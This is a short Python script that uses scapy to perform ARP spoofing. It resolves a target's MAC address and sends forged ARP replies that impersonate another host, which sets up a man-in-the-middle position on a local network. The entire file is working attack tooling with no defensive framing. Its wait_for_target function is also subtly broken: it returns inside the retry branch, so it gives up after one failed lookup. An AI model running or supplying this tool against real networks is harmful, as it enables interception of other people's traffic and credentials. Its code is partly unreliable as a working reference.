import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"Cannot find mac for {target_ip}")
        return
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_response, verbose=False)

def wait_for_target(target_ip, spoof_ip):
    print(f"Waiting for {target_ip} to be online...")
    while True:
        target_mac = get_mac(target_ip)
        if target_mac:
            print(f"Found {target_ip} with MAC {target_mac}. Starting ARP spoofing...")
            break
        else:
            print(f"{target_ip} not found. Retrying...")
            return target_mac